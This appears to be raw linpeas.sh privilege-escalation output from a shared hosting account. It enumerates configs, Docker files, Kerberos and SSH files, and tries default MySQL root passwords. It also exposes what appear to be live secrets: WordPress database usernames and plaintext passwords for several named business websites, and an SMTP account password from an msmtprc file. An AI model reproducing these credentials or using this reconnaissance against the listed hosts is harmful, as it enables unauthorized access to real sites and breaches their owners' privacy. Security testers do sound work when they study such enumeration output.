odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root 996 62125 Apr 20 19:37 /opt/alt/php83/etc/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root 996 61333 Apr 20 19:37 /opt/alt/php84/etc/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 39852 Mar 21 09:19 /usr/local/lsws/add-ons/directadmin/php.ini
allow_call_time_pass_reference = On
allow_url_fopen = On
odbc.allow_persistent = On
mysql.allow_persistent = On
msql.allow_persistent = On
pgsql.allow_persistent = On
sybase.allow_persistent = On
sybct.allow_persistent = On
ifx.allow_persistent = On
mssql.allow_persistent = On
ingres.allow_persistent = On
-rw-r--r-- 1 root root 37999 Mar 21 09:19 /usr/local/lsws/admin/misc/php.ini
allow_call_time_pass_reference = Off
allow_url_fopen = On
odbc.allow_persistent = On
mysql.allow_persistent = On
msql.allow_persistent = On
pgsql.allow_persistent = On
sybase.allow_persistent = On
sybct.allow_persistent = On
ifx.allow_persistent = On
mssql.allow_persistent = On
ingres.allow_persistent = On
-rw-r--r-- 1 root root 62671 Aug  9  2023 /usr/selector.etc/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On

-rwxrwxr-x 1 root root 8186 Sep  1  2022 /opt/HPEMRSA/LSIStorageAuthority/server/conf/Sample_SSL_https/nginx.conf
user  root;
worker_processes  1;
events {
    worker_connections  1024;
}
http {
    include       mime.types;
    default_type  application/octet-stream;
    sendfile        on;
    keepalive_timeout  65;
        
    client_max_body_size 40M;
    
        index  index.html index.htm;
    server {
        listen       nginx_default default_server ssl;
        listen       [::]:nginx_default ipv6only=on default_server ssl;
        server_name  localhost;
        
        ssl_certificate      ssl.crt;
        ssl_certificate_key  ssl.key;
        ssl_session_timeout  10m;
        ssl_protocols        TLSv1.3;
        ssl_prefer_server_ciphers   on;
        ssl_session_cache   shared:SSL:10m;
        
        access_log off;
        server_tokens off;
                
        root   html;
                
                add_header X-Frame-Options "SAMEORIGIN";
                add_header X-Content-Type-Options "nosniff" always;
                add_header Content-Security-Policy "default-src 'self'; font-src *;img-src * data:; script-src *; style-src *;";
                add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
                
                
        client_max_body_size 40M;
        
        location / {
            
            proxy_redirect off;
            proxy_set_header Host $host:$server_port;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Ssl on;
                        
            add_header X-Frame-Options "SAMEORIGIN";
                        add_header X-Content-Type-Options "nosniff" always;
                        add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; font-src 'self' data:;" always;
                        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
        add_header Last-Modified $date_gmt;
        add_header Cache-Control 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0';
        if_modified_since off;
        expires off;
        etag off;
        }
        location ~* ^/lsi/storage/mr/api/1.0/servers/[0-9a-zA-Z\:\-\.]+/operations/upload\-file$ {
            upload_pass   @test;
            upload_store upload_files 1;
            
            upload_store_access user:rw;
            upload_set_form_field $upload_field_name.name "$upload_file_name";
                        upload_set_form_field $upload_field_name.path "$upload_tmp_path";
                        
                        upload_resumable on;
                        
                        upload_max_file_size 0;
                        
                        client_max_body_size 40M;
        }
                location ~* ^/lsi/storage/mr/api/1.0/servers/[0-9a-zA-Z\:\-\.]+/controllers/[0-9]+/slotgroups/[0-9]+/slots/[0-9]+/operations/import$ {
                        upload_pass   @test;
                        upload_store upload_certs ;
                        upload_store_access user:rw;
                        upload_set_form_field $upload_field_name.name "$upload_file_name";
                        upload_set_form_field $upload_field_name.path "$upload_tmp_path";
                        upload_resumable on;
                        upload_max_file_size 0;
                        client_max_body_size 40M;
        }
                
        location  ~* ^/lsi/storage/mr/api/1?\.?0?/?.*$ {
            include            fastcgi_params;
            fastcgi_pass       127.0.0.1:LSA_Default;
            fastcgi_read_timeout 150s;
        }
 
        location @test {
                        include            fastcgi_params;
            fastcgi_pass       127.0.0.1:LSA_Default;
        }
        error_page   500 502 503 504  /50x.html;
    }
}
-rwxrwxr-x 1 root root 7737 Aug 29  2023 /opt/HPEMRSA/LSIStorageAuthority/server/conf/nginx.conf
user  root;
worker_processes  1;
events {
    worker_connections  1024;
}
http {
    include       mime.types;
    default_type  application/octet-stream;
    sendfile        on;
    keepalive_timeout  65;
        
    client_max_body_size 40M;
    
        index  index.html index.htm;
    server {
        listen       2463 default_server;
        listen       [::]:2463 ipv6only=on default_server;
        server_name  localhost;
        
        error_page 497  http://$host:$server_port$request_uri;
        access_log off;
        server_tokens off;
                
        root   html;
                
                add_header X-Frame-Options "SAMEORIGIN";
                add_header X-Content-Type-Options "nosniff" always;
                add_header Content-Security-Policy "default-src 'self'; font-src *;img-src * data:; script-src *; style-src *;";
                
                
        client_max_body_size 40M;
        
        location / {
            
            proxy_redirect off;
            proxy_set_header Host $host:$server_port;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Ssl on;
                        
            add_header X-Frame-Options "SAMEORIGIN";
                        add_header X-Content-Type-Options "nosniff" always;
                        add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; font-src 'self' data:;" always;
        add_header Last-Modified $date_gmt;
        add_header Cache-Control 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0';
        if_modified_since off;
        expires off;
        etag off;
        }
         location ~* ^/lsi/storage/mr/api/1.0/servers/[0-9a-zA-Z\:\-\.]+/operations/upload\-file$ {
            upload_pass   @test;
            upload_store upload_files 1;
            
            upload_store_access user:rw;
            upload_set_form_field $upload_field_name.name "$upload_file_name";
            
            upload_set_form_field $upload_field_name.path "$upload_tmp_path";
            
                        
            upload_resumable on;
                
            upload_max_file_size 0;
        
            client_max_body_size 40M;
        }
                location ~* ^/lsi/storage/mr/api/1.0/servers/[0-9a-zA-Z\:\-\.]+/controllers/[0-9]+/slotgroups/[0-9]+/slots/[0-9]+/operations/import$ {
                        upload_pass   @test;
                        upload_store upload_certs ;
                        upload_store_access user:rw;
                        upload_set_form_field $upload_field_name.name "$upload_file_name";
                        upload_set_form_field $upload_field_name.path "$upload_tmp_path";
                        upload_resumable on;
                        upload_max_file_size 0;
                        client_max_body_size 40M;
        }
        location  ~* ^/lsi/storage/mr/api/1?\.?0?/?.*$ {
            include            fastcgi_params;
            fastcgi_pass       127.0.0.1:9000;
            fastcgi_read_timeout 150s;
        }
        location @test {
                        include            fastcgi_params;
            fastcgi_pass       127.0.0.1:9000;
        }
        error_page   500 502 503 504  /50x.html;
    }
}

-rwxrwxr-x 1 root root 8940816 Dec 24  2020 /opt/HPEMRSA/LSIStorageAuthority/server/nginx


╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/index.html#docker-breakout--privilege-escalation
-rw-r--r-- 1 u311353020 o50030915 1178 Jun  4  2024 /home/u311353020/domains/farmaceuticaambriz.com/public_html/wp-content/plugins/hostinger-ai-assistant/vendor/hostinger/hostinger-wp-helper/Dockerfile
-rw-r--r-- 1 u311353020 o50030915 979 Jun  4  2024 /home/u311353020/domains/farmaceuticaambriz.com/public_html/wp-content/plugins/hostinger-ai-assistant/vendor/hostinger/hostinger-wp-helper/docker-compose.yml
-rw-r--r-- 1 u311353020 o50030915 1178 Jun  4  2024 /home/u311353020/domains/farmaceuticaambriz.com/public_html/wp-content/plugins/hostinger/vendor/hostinger/hostinger-wp-helper/Dockerfile
-rw-r--r-- 1 u311353020 o50030915 979 Jun  4  2024 /home/u311353020/domains/farmaceuticaambriz.com/public_html/wp-content/plugins/hostinger/vendor/hostinger/hostinger-wp-helper/docker-compose.yml
-rw-r--r-- 1 u311353020 o50030915 1178 Aug 13  2024 /home/u311353020/domains/hipermaq.com/public_html/wp-content/plugins/hostinger-ai-assistant/vendor/hostinger/hostinger-wp-helper/Dockerfile
-rw-r--r-- 1 u311353020 o50030915 979 Aug 13  2024 /home/u311353020/domains/hipermaq.com/public_html/wp-content/plugins/hostinger-ai-assistant/vendor/hostinger/hostinger-wp-helper/docker-compose.yml
-rw-r--r-- 1 u311353020 o50030915 1178 Aug 13  2024 /home/u311353020/domains/hipermaq.com/public_html/wp-content/plugins/hostinger/vendor/hostinger/hostinger-wp-helper/Dockerfile
-rw-r--r-- 1 u311353020 o50030915 979 Aug 13  2024 /home/u311353020/domains/hipermaq.com/public_html/wp-content/plugins/hostinger/vendor/hostinger/hostinger-wp-helper/docker-compose.yml
-rw-r--r-- 1 root root 1079 May  8  2024 /opt/alt/python311/lib/python3.11/site-packages/tests/config/docker-compose.yml
-rw-r--r-- 1 root root 1079 Aug  9  2023 /opt/alt/python37/lib/python3.7/site-packages/tests/config/docker-compose.yml
-r--r--r-- 1 root root 713 Aug  9  2023 /opt/go/pkg/mod/github.com/prometheus/alertmanager@v0.25.0/Dockerfile
-r--r--r-- 1 root root 98 Aug  9  2023 /opt/go/pkg/mod/github.com/prometheus/alertmanager@v0.25.0/template/Dockerfile
-r--r--r-- 1 root root 412 Aug  9  2023 /opt/go/pkg/mod/github.com/prometheus/alertmanager@v0.25.0/ui/Dockerfile
-r--r--r-- 1 root root 1415 Aug  9  2023 /opt/go/pkg/mod/github.com/prometheus/client_golang@v1.14.0/Dockerfile
-r--r--r-- 1 root root 1486 Aug  9  2023 /opt/go/pkg/mod/golang.org/x/net@v0.4.0/http2/Dockerfile
-r--r--r-- 1 root root 3610 Aug  9  2023 /opt/go/pkg/mod/golang.org/x/sys@v0.3.0/unix/linux/Dockerfile
-rw-r--r-- 1 root root 2008 Dec  1  2022 /opt/golang/1.19.4/src/crypto/internal/boring/Dockerfile
-rw-r--r-- 1 root root 506 Dec  1  2022 /opt/golang/1.19.4/src/crypto/internal/nistec/fiat/Dockerfile
-rw-r--r-- 1 root root 2283 Feb  2  2024 /opt/golang/1.22.0/src/crypto/internal/boring/Dockerfile
-rw-r--r-- 1 root root 506 Feb  2  2024 /opt/golang/1.22.0/src/crypto/internal/nistec/fiat/Dockerfile

╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 u311353020 o50030915 3327 Mar 17  2023 /home/u311353020/domains/entornoclean.mx/public_html/wp-config.php
define( 'DB_NAME', 'u311353020_7NZQ2' );
define( 'DB_USER', 'u311353020_zO4Zx' );
define( 'DB_PASSWORD', 'AoSUy1Vm3j' );
define( 'DB_HOST', '127.0.0.1' );
-rw-r--r-- 1 u311353020 o50030915 3233 Jul  6  2024 /home/u311353020/domains/fanrich.com.mx/public_html/wp-config.php
define( 'DB_NAME', "u311353020_fanrich" );
define( 'DB_USER', "u311353020_fanrich" );
define( 'DB_PASSWORD', "wpQ&kSD6:" );
define( 'DB_HOST', "localhost" );
-rw-r--r-- 1 u311353020 o50030915 4041 Jul  6  2024 /home/u311353020/domains/fanrich.com.mx/public_html/wp-content/plugins/duplicator/installer/dup-installer/templates/default/pages-parts/step3/options-tabs/wp-config.php
-rw-r--r-- 1 u311353020 o50030915 3435 Apr 11  2024 /home/u311353020/domains/farmaceuticaambriz.com/public_html/wp-config.php
define( 'DB_NAME', 'u311353020_zcMMR' );
define( 'DB_USER', 'u311353020_MLmXs' );
define( 'DB_PASSWORD', 'WCaKxSgO1G' );
define( 'DB_HOST', '127.0.0.1' );
-rw-r--r-- 1 u311353020 o50030915 5594 Jun  4  2024 /home/u311353020/domains/farmaceuticaambriz.com/public_html/wp-content/plugins/hostinger-ai-assistant/vendor/hostinger/hostinger-wp-helper/docker/wordpress/wp-config.php
define( 'DB_NAME', getenv_docker('WORDPRESS_DB_NAME', 'wordpress') );
define( 'DB_USER', getenv_docker('WORDPRESS_DB_USER', 'example username') );
define( 'DB_PASSWORD', getenv_docker('WORDPRESS_DB_PASSWORD', 'example password') );
define( 'DB_HOST', getenv_docker('WORDPRESS_DB_HOST', 'mysql') );
-rw-r--r-- 1 u311353020 o50030915 2707 Mar 11  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-config.php
define( 'DB_NAME', 'u311353020_ZZfGX' );
define( 'DB_USER', 'u311353020_qT2RZ' );
define( 'DB_PASSWORD', 'btrb44LXsy' );
define( 'DB_HOST', 'mysql' );
-rw-r--r-- 1 u311353020 o50030915 3471 Aug 13  2024 /home/u311353020/domains/hipermaq.com/public_html/wp-config.php
define( 'DB_NAME', 'u311353020_cORoM' );
define( 'DB_USER', 'u311353020_0SPhc' );
define( 'DB_PASSWORD', 'pBb7xGnMgq' );
define( 'DB_HOST', '127.0.0.1' );
-rw-r--r-- 1 u311353020 o50030915 5594 Aug 13  2024 /home/u311353020/domains/hipermaq.com/public_html/wp-content/plugins/hostinger-ai-assistant/vendor/hostinger/hostinger-wp-helper/docker/wordpress/wp-config.php
define( 'DB_NAME', getenv_docker('WORDPRESS_DB_NAME', 'wordpress') );
define( 'DB_USER', getenv_docker('WORDPRESS_DB_USER', 'example username') );
define( 'DB_PASSWORD', getenv_docker('WORDPRESS_DB_PASSWORD', 'example password') );
define( 'DB_HOST', getenv_docker('WORDPRESS_DB_HOST', 'mysql') );
-rw-r--r-- 1 u311353020 o50030915 3327 Mar 17  2023 /home/u311353020/domains/sefinad.com/public_html/wp-config.php
define( 'DB_NAME', 'u311353020_8PoNR' );
define( 'DB_USER', 'u311353020_AF9fw' );
define( 'DB_PASSWORD', 'crZuAwtMK5' );
define( 'DB_HOST', '127.0.0.1' );

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Mar 26 19:37 /etc/pam.d


╔══════════╣ Analyzing Cloud Credentials Files (limit 70)
./linpeas.sh: line 3967: pwsh: command not found
pwsh Not Found









dr-xr-xr-x 2 root root 4096 Aug  9  2023 /opt/go/pkg/mod/golang.org/x/oauth2@v0.0.0-20220909003341-f21342109be1/google/testdata/gcloud
dr-xr-xr-x 2 root root 4096 Aug  9  2023 /opt/go/pkg/mod/golang.org/x/oauth2@v0.0.0-20220909003341-f21342109be1/google/testdata/gcloud
-r--r--r-- 1 root root 6668 Aug  9  2023 /opt/go/pkg/mod/golang.org/x/oauth2@v0.0.0-20220909003341-f21342109be1/google/testdata/gcloud/credentials
-r--r--r-- 1 root root 32 Aug  9  2023 /opt/go/pkg/mod/golang.org/x/oauth2@v0.0.0-20220909003341-f21342109be1/google/testdata/gcloud/properties


















╔══════════╣ Analyzing Redis Files (limit 70)
redis-server Not Found
lrwxrwxrwx 1 root root 16 Aug  4  2023 /opt/alt/redis/etc/redis.conf -> redis/redis.conf

╔══════════╣ Analyzing Backup Manager Files (limit 70)
-rw-r--r-- 1 u311353020 o50030915 6043 Jul  6  2024 /home/u311353020/domains/fanrich.com.mx/public_html/wp-content/plugins/duplicator/template/mocks/storage/storage.php
-rw-r--r-- 1 u311353020 o50030915 6743 Jul  6  2024 /home/u311353020/domains/fanrich.com.mx/public_html/wp-content/plugins/duplicator/views/settings/storage.php

-rw-r--r-- 1 u311353020 o50030915 6706 Aug 23  2020 /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/includes/functions/database.php
-rw-r--r-- 1 u311353020 o50030915 6493 Aug 23  2020 /home/u311353020/domains/grupors.com.mx/public_html/old/includes/functions/database.php

╔══════════╣ Analyzing FastCGI Files (limit 70)
-rwxrwxr-x 1 root root 964 Aug  2  2017 /opt/HPEMRSA/LSIStorageAuthority/server/conf/fastcgi_params

╔══════════╣ Analyzing Http conf Files (limit 70)
-rw-r--r-- 1 root root 0 Mar 21 09:19 /usr/local/lsws/add-ons/frontpage/conf/httpd.conf

╔══════════╣ Analyzing Msmtprc Files (limit 70)
-rw------- 1 u311353020 o50030915 181 Nov 20 09:10 /home/u311353020/.msmtprc
account default
host 127.0.0.1
port 125
auth login
user u311353020
password 247d9641f19a65cf8aecbb88954a32017e8b806e54f633ccd506d3403272b952
from u311353020@srv1099.main-hosting.eu

╔══════════╣ Analyzing Github Files (limit 70)
drwxr-xr-x 3 u311353020 o50030915 4096 Jul  6  2024 /home/u311353020/domains/fanrich.com.mx/public_html/wp-content/plugins/svg-support/vendor/enshrined/svg-sanitize/.github
drwxr-xr-x 3 u311353020 o50030915 4096 Dec 10 17:27 /home/u311353020/domains/hipermaq.com/public_html/wp-content/plugins/hostinger-easy-onboarding/vendor/hostinger/hostinger-wp-amplitude/.github
drwxr-xr-x 3 u311353020 o50030915 4096 Dec 10 17:27 /home/u311353020/domains/hipermaq.com/public_html/wp-content/plugins/hostinger-easy-onboarding/vendor/hostinger/hostinger-wp-helper/.github
drwxr-xr-x 3 u311353020 o50030915 4096 Dec 10 17:27 /home/u311353020/domains/hipermaq.com/public_html/wp-content/plugins/hostinger-easy-onboarding/vendor/hostinger/hostinger-wp-menu-manager/.github
drwxr-xr-x 3 u311353020 o50030915 4096 Dec 10 17:27 /home/u311353020/domains/hipermaq.com/public_html/wp-content/plugins/hostinger-easy-onboarding/vendor/hostinger/hostinger-wp-surveys/.github
drwxr-xr-x 3 root root 4096 Feb 24 12:05 /opt/.wp-cli/packages/vendor/composer/semver/.github
drwxr-xr-x 3 root root 4096 Mar 20  2024 /opt/.wp-cli/packages/vendor/wp-cli/checksum-command/.github
drwxr-xr-x 3 root root 4096 Mar 20  2024 /opt/.wp-cli/packages/vendor/wp-cli/core-command/.github
drwxr-xr-x 3 root root 4096 Mar 20  2024 /opt/.wp-cli/packages/vendor/wp-cli/cron-command/.github
drwxr-xr-x 3 root root 4096 Mar 20  2024 /opt/.wp-cli/packages/vendor/wp-cli/doctor-command/.github
drwxr-xr-x 3 root root 4096 Mar 20  2024 /opt/.wp-cli/packages/vendor/wp-cli/entity-command/.github
drwxr-xr-x 3 root root 4096 Mar 20  2024 /opt/.wp-cli/packages/vendor/wp-cli/extension-command/.github
drwxr-xr-x 3 root root 4096 Mar 20  2024 /opt/.wp-cli/packages/vendor/wp-cli/language-command/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/asaskevich/govalidator@v0.0.0-20210307081110-f21760c49a8d/.github
dr-xr-xr-x 4 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/aws/aws-sdk-go@v1.44.156/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/cenkalti/backoff/v4@v4.2.0/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/cespare/xxhash/v2@v2.2.0/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/coreos/go-systemd/v22@v22.4.0/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/go-kit/log@v0.2.1/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/go-logfmt/logfmt@v0.5.1/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/go-logr/logr@v1.2.3/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/go-logr/stdr@v1.2.2/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/go-openapi/analysis@v0.21.4/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/go-openapi/errors@v0.20.3/.github
dr-xr-xr-x 2 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/go-openapi/jsonpointer@v0.19.5/.github
dr-xr-xr-x 2 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/go-openapi/jsonreference@v0.20.0/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/go-openapi/loads@v0.21.2/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/go-openapi/runtime@v0.25.0/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/go-openapi/spec@v0.20.7/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/go-openapi/strfmt@v0.21.3/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/go-openapi/swag@v0.22.3/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/go-openapi/validate@v0.22.0/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/gofrs/uuid@v4.3.1+incompatible/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/gogo/protobuf@v1.3.2/.github
dr-xr-xr-x 4 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/golang/protobuf@v1.5.2/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/hashicorp/golang-lru@v0.6.0/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/hashicorp/memberlist@v0.5.0/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/miekg/dns@v1.1.41/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/mitchellh/mapstructure@v1.5.0/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/oklog/run@v1.1.0/.github
dr-xr-xr-x 2 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/opentracing/opentracing-go@v1.2.0/.github
dr-xr-xr-x 2 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/prometheus/alertmanager@v0.25.0/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/prometheus/client_golang@v1.14.0/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/prometheus/client_model@v0.3.0/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/prometheus/common@v0.38.0/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/prometheus/exporter-toolkit@v0.8.2/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/prometheus/procfs@v0.8.0/.github
dr-xr-xr-x 4 root root 4096 Aug  9  2023 /opt/go/pkg/mod/go.opentelemetry.io/otel@v1.11.1/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/google.golang.org/protobuf@v1.28.1/.github
dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/gopkg.in/yaml.v3@v3.0.1/.github
drwxr-xr-x 2 root 89939 4096 Dec 16  2021 /opt/gsutil/gslib/vendored/oauth2client/.github
drwxr-xr-x 3 root 89939 4096 Oct  7  2024 /opt/gsutil/third_party/argcomplete/.github
drwxr-xr-x 4 root 89939 4096 Aug 18  2024 /opt/gsutil/third_party/cachetools/.github
drwxr-xr-x 3 root 89939 4096 Aug 30  2024 /opt/gsutil/third_party/certifi/.github
drwxr-xr-x 3 root 89939 4096 Aug  1  2023 /opt/gsutil/third_party/chardet/.github
drwxr-xr-x 4 root 89939 4096 Oct  9  2024 /opt/gsutil/third_party/charset_normalizer/.github
drwxr-xr-x 3 root 89939 4096 Mar 22  2024 /opt/gsutil/third_party/google-auth-library-python-httplib2/.github
drwxr-xr-x 3 root 89939 4096 Nov 30  2023 /opt/gsutil/third_party/google-auth-library-python/.github
drwxr-xr-x 3 root 89939 4096 Feb  2  2022 /opt/gsutil/third_party/httplib2/.github
drwxr-xr-x 3 root 89939 4096 Sep 15  2024 /opt/gsutil/third_party/idna/.github
drwxr-xr-x 3 root 89939 4096 Nov 26 17:32 /opt/gsutil/third_party/pyasn1/.github
drwxr-xr-x 3 root 89939 4096 Aug 25  2024 /opt/gsutil/third_party/pyparsing/.github



drwxr-xr-x 8 root root 4096 Feb 24 12:05 /opt/.wp-cli/packages/vendor/composer/semver/.git
drwxr-xr-x 8 root root 4096 Feb 24 12:05 /opt/.wp-cli/packages/vendor/wp-cli/checksum-command/.git
drwxr-xr-x 8 root root 4096 May  9  2024 /opt/.wp-cli/packages/vendor/wp-cli/core-command/.git
drwxr-xr-x 8 root root 4096 Feb 24 12:05 /opt/.wp-cli/packages/vendor/wp-cli/cron-command/.git
drwxr-xr-x 8 root root 4096 Mar 20  2024 /opt/.wp-cli/packages/vendor/wp-cli/doctor-command/.git
drwxr-xr-x 8 root root 4096 Mar 18 13:13 /opt/.wp-cli/packages/vendor/wp-cli/entity-command/.git
drwxr-xr-x 8 root root 4096 Feb 24 12:05 /opt/.wp-cli/packages/vendor/wp-cli/extension-command/.git
drwxr-xr-x 8 root root 4096 Feb 24 12:05 /opt/.wp-cli/packages/vendor/wp-cli/language-command/.git

╔══════════╣ Analyzing Svn Files (limit 70)
drwxr-xr-x 3 u311353020 o50030915 4096 Aug 23  2020 /home/u311353020/domains/grupors.com.mx/public_html/ventas/modules/Google/handlers/.svn
/home/u311353020/domains/grupors.com.mx/public_html/ventas/modules/Google/handlers/.svn:
total 20
-rw-r--r-- 1 u311353020 o50030915  415 Aug 23  2020 all-wcprops
-rw-r--r-- 1 u311353020 o50030915  529 Aug 23  2020 entries
drwxr-xr-x 2 u311353020 o50030915 4096 Aug 23  2020 text-base

/home/u311353020/domains/grupors.com.mx/public_html/ventas/modules/Google/handlers/.svn/text-base:
total 20
-rw-r--r-- 1 u311353020 o50030915 5269 Aug 23  2020 Vtiger.php.svn-base
-rw-r--r-- 1 u311353020 o50030915  784 Aug 23  2020 VtigerSync.php.svn-base

╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rwxrwxr-x 1 root root 0 Aug  2  2017 /opt/HPEMRSA/LSIStorageAuthority/server/logs/access.log

-rwxrwxr-x 1 root root 126 Mar  6  2024 /opt/HPEMRSA/LSIStorageAuthority/server/logs/error.log

╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 376 Aug  3  2022 /etc/skel/.bashrc
-rw-r--r-- 1 65537 1004 376 Aug  3  2022 /opt/ipmi_exporter/.bashrc









╔══════════╣ Analyzing Windows Files (limit 70)






















-rw-r--r-- 1 root root 2329 Dec  9 19:58 /etc/my.cnf

























-rw-r--r-- 1 u311353020 o50030915 292 May 29  2022 /home/u311353020/domains/entornoclean.mx/public_html/wp-content/ai1wm-backups/web.config
-rw-r--r-- 1 u311353020 o50030915 292 Mar 11  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/ai1wm-backups/web.config
-rw-r--r-- 1 u311353020 o50030915 292 Nov 21  2022 /home/u311353020/domains/sefinad.com/public_html/wp-content/ai1wm-backups/web.config




╔══════════╣ Searching kerberos conf files and tickets
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-active-directory.html#linux-active-directory
ptrace protection is disabled (0), you might find tickets inside processes memory
-rw-r--r-- 1 root root 812 Nov  6  2023 /opt/alt/krb5/usr/etc/krb5.conf
# To opt out of the system crypto-policies configuration of krb5, remove the
# symlink at /etc/krb5.conf.d/crypto-policies which will not be recreated.
includedir /etc/krb5.conf.d/

[logging]
    default = FILE:/var/log/krb5libs.log
    kdc = FILE:/var/log/krb5kdc.log
    admin_server = FILE:/var/log/kadmind.log

[libdefaults]
    dns_lookup_realm = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false
    pkinit_anchors = FILE:/etc/pki/tls/certs/ca-bundle.crt
    spake_preauth_groups = edwards25519
#    default_realm = EXAMPLE.COM
    default_ccache_name = KEYRING:persistent:%{uid}

[realms]
# EXAMPLE.COM = {
#     kdc = kerberos.example.com
#     admin_server = kerberos.example.com
# }

[domain_realm]
# .example.com = EXAMPLE.COM
# example.com = EXAMPLE.COM
-rw-r--r-- 1 root root 212 Nov 15  2023 /usr/lib64/sssd/conf/sssd.conf
[sssd]
services = nss, pam
domains = shadowutils

[nss]

[pam]

[domain/shadowutils]
id_provider = proxy
proxy_lib_name = files

auth_provider = proxy
proxy_pam_target = sssd-shadowutils

proxy_fast_alias = True
tickets kerberos Not Found
klist Not Found


╔══════════╣ Searching mysql credentials and exec

╔══════════╣ MySQL version
mysql  Ver 15.1 Distrib 10.11.10-MariaDB, for Linux (x86_64) using readline 5.1


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No
═╣ MySQL connection using root/NOPASS ................. No

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw------- 1 u311353020 o50030915 1200 Apr 20 10:11 /home/u311353020/.gnupg/trustdb.gpg
-rw-r--r-- 1 root root 3290 Jan  1  2020 /usr/share/gnupg/distsigkey.gpg

drwx------ 2 u311353020 o50030915 4096 Apr 21 00:24 /home/u311353020/.gnupg

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/passwd
passwd file: /home/u311353020/.cagefs/tmp/passwd
passwd file: /tmp/passwd

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)


-rw-r--r-- 1 u311353020 o50030915 184 Oct  2  2023 /home/u311353020/.ssh/known_hosts
